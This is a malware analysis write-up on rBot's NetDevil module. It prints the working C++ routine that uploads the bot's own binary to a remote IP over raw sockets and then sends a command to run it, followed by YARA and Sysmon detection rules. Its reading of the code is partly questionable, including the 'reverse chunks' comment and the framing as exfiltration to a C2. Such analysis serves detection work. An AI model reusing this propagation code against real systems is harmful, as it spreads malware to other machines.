# rBot/NetDevil: Binary Upload Over Raw Sockets

**Repository:** `theZoo-master`  
**File:** `malware/Source/Original/rBot0.3.3_May2004/rBot0.3.3_May2004/rBot 0.3.3 - May 2004/netdevil.cpp`  
**Language:** C++  
**MITRE ATT&CK:** T1041 (Exfiltration Over C2 Channel)

### Executive Summary

The NetDevil module within the rBot malware family provides a clear example of exfiltration over a custom command-and-control (C2) channel. It implements a bespoke protocol to upload its own binary to a remote server using raw TCP sockets. The code showcases a dual-channel communication strategy—one for control and another for data transfer—and even supports two different versions of its protocol, highlighting how malware evolves. This technique was primarily used for bot propagation and to allow malware authors to retrieve binaries from infected machines for analysis or updates.

### Code Snippet & Analysis

The core of the exfiltration logic is in the `NetDevil_Upload` function. It establishes a control connection, negotiates a protocol version and data port with the C2 server, then opens a second, parallel connection to transfer the file data.

```cpp
int NetDevil_Upload(char *IP, SOCKET ssock)
{
	SOCKET nsock;
	char buffer[1024], botfile[MAX_PATH], rFile[MAX_PATH];
	int port = 0, bytes_sent = 0;
	unsigned int Fsend = 1024, Fsize;
	DWORD mode = 0;
	BOOL ver15 = FALSE;

	// 1. Get the full path to the bot's own executable
	GetModuleFileName(NULL, botfile, sizeof(botfile));

	// 2. Send "version" to the C2 on the control socket to negotiate protocol
	fsend(ssock, "version", 7, 0);
	memset(buffer, 0, sizeof(buffer));
	frecv(ssock, buffer, sizeof(buffer), 0);
	if (strlen(buffer) > 5) {
		buffer[strlen(buffer)-2] = '\0';
		char *uPort = strrchr(buffer, '\n\r');
		if (uPort != NULL) 
			port = atoi(uPort); // C2 can specify a port for data transfer
	}

	// 3. Check if the C2 server supports the newer "v1.5" protocol
	char *ver = strtok(buffer,"\n\r");
	if (strcmp(buffer,"ver1.5") == 0) 
		ver15 = TRUE; 
	sprintf(rFile,"C:\\%s",filename);

	// 4. Create a new data socket on the port specified by the C2 (default 903)
	port = ((port == 0)?(903):(port));
	if ((nsock = CreateSock(IP,port)) == INVALID_SOCKET) 
		goto end;

	// 5. Open the bot's executable file for reading
	HANDLE testfile; 
	if ((testfile = CreateFile(botfile,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0)) == INVALID_HANDLE_VALUE) 
		goto end;
	Fsize = GetFileSize(testfile,NULL);

	// 6. Initialize the transfer with different formats for each protocol version
	if (ver15)
		sprintf(buffer,"cmd[003]%s|%i|\n\r",rFile,Fsize); // v1.5: Structured command
	else
		sprintf(buffer,"%s\r1",rFile); // v1.0: Simple format
	fsend(nsock, buffer, strlen(buffer), 0);
	if (frecv(nsock, buffer, sizeof(buffer), 0) < 1) 
		goto end;

	// 7. Main file transfer loop
	while (Fsize) {
		memset(buffer,0,sizeof(buffer));
		if (Fsend>Fsize) Fsend=Fsize;
		
        // Reads the file in reverse chunks from the end
		SetFilePointer(testfile, 0-Fsize, NULL, FILE_END);
		ReadFile(testfile, buffer, Fsend, &mode, NULL);
		
        // Send the chunk over the data socket
		bytes_sent = fsend(nsock, buffer, Fsend, 0);
		if (bytes_sent == SOCKET_ERROR) {
			if (fWSAGetLastError() != WSAEWOULDBLOCK) goto end;
			else bytes_sent = 0;
		}
		Fsize = Fsize - bytes_sent;

		// v1.0 requires waiting for a C2 response after each chunk (lock-step)
		if (!ver15 && frecv(nsock, buffer, sizeof(buffer), 0) < 1) 
			goto end;
	}

	if (testfile != INVALID_HANDLE_VALUE) CloseHandle(testfile);
	fclosesocket(nsock); // Data socket closed
	Sleep(2000);

	// 8. Send a final command on the control socket to execute the uploaded file
	sprintf(buffer,"pleaz_run%s",rFile);
	fsend(ssock, buffer,strlen(buffer), 0);
	
    // ... cleanup ...
	fclosesocket(ssock); // Control socket closed
	return 1;

	end:;
	fclosesocket(nsock);
	fclosesocket(ssock);
	return 0;
}
```

### What it does

- **Dual-Channel C2:** The malware establishes an initial TCP connection to the C2 server for control commands. It then negotiates a separate port to open a second, parallel TCP connection dedicated to transferring file data.
- **Protocol Negotiation:** It performs a handshake by sending `"version"` to the C2. The server's response determines which version of the file transfer protocol to use (v1.0 or v1.5), demonstrating protocol evolution.
- **Self-Upload:** The function locates its own executable file on disk using `GetModuleFileName`.
- **Chunked Transfer:** It reads its own binary in 1024-byte chunks and sends them one by one over the data socket until the entire file is transferred.
- **Remote Execution Request:** After the upload is complete, it sends a `pleaz_run` command back on the original control socket, instructing the C2 server to execute the file it just received.

### Why it's a TTP

This is a classic example of **Exfiltration Over C2 Channel (T1041)**. Instead of using a standard, high-level protocol like HTTP or FTP, the malware uses a low-level, custom TCP-based protocol. This has several advantages for the attacker:
- **Stealth:** The custom protocol is not easily understood by network security appliances that are designed to inspect common protocols.
- **Control:** It gives the attacker full control over the data transfer, including error handling and flow control (as seen in the v1.0 lock-step mechanism).
- **Efficiency:** By using raw sockets, the protocol can be tailored to be lightweight and efficient, avoiding the overhead of protocols like HTTP.

The dual-channel approach further complicates analysis, as a defender might only observe the initial control connection without realizing a separate data connection is being used for the exfiltration itself.

### Detection & Evasion

#### Yara

This Yara rule detects the unique strings and protocol markers used by the NetDevil module. The combination of the version negotiation strings, the file transfer commands, and the remote execution request creates a high-fidelity signature.

```yara
rule TTP_Exfil_rBot_NetDevil_RawSocket {
    meta:
        author = "Red Team"
        description = "Detects the NetDevil raw socket file upload protocol used in rBot."
        ttp = "T1041"
    strings:
        // Protocol negotiation and commands
        $proto_ver = "version" ascii wide
        $proto_ver_resp = "ver1.5" ascii wide
        $pleaz_run = "pleaz_run" ascii wide
        
        // v1.5 specific command
        $cmd_003 = "cmd[003]" ascii wide

        // Keywords related to the upload process
        $kw1 = "NetDevil_Upload" ascii
        $kw2 = "CreateSock" ascii
        $kw3 = "GetModuleFileNameA" ascii // Windows API used

    condition:
        uint16(0) == 0x5A4D and // Is a PE file
        all of ($kw*) and
        (1 of ($proto*) or $cmd_003)
}
```

#### Sysmon

Detecting this activity with Sysmon requires correlating multiple events. The primary indicator is a process creating two separate outbound TCP connections to the same destination IP but on different ports in a short time frame.

- **Event ID 3 (Network Connect):** Monitor for a process making an initial connection (the control channel), followed shortly by another connection to a different port on the same remote IP (the data channel). The default data port is 903, which is non-standard and suspicious.

```xml
<Sysmon schemaversion="4.82">
    <!-- Capture all network connections -->
    <RuleGroup name="TTP_Exfil_rBot_NetDevil_RawSocket" groupRelation="or">
        <NetworkConnect onmatch="include">
            <!-- Look for connections to the default NetDevil data port -->
            <DestinationPort>903</DestinationPort>
        </NetworkConnect>
        <NetworkConnect onmatch="include">
            <!-- 
                Suspicious: A process running from a temp location making any network connection.
                This is a more generic rule that could catch rBot.
            -->
            <Image condition="begin with">C:\Users\</Image>
            <Image condition="contains">\AppData\Local\Temp\</Image>
        </NetworkConnect>
    </RuleGroup>
</Sysmon>
```
**Note:** A sophisticated EDR or SIEM would be needed to write the correlation logic to detect the dual-channel behavior effectively. The provided Sysmon rule is a starting point for detecting connections to the known default port.
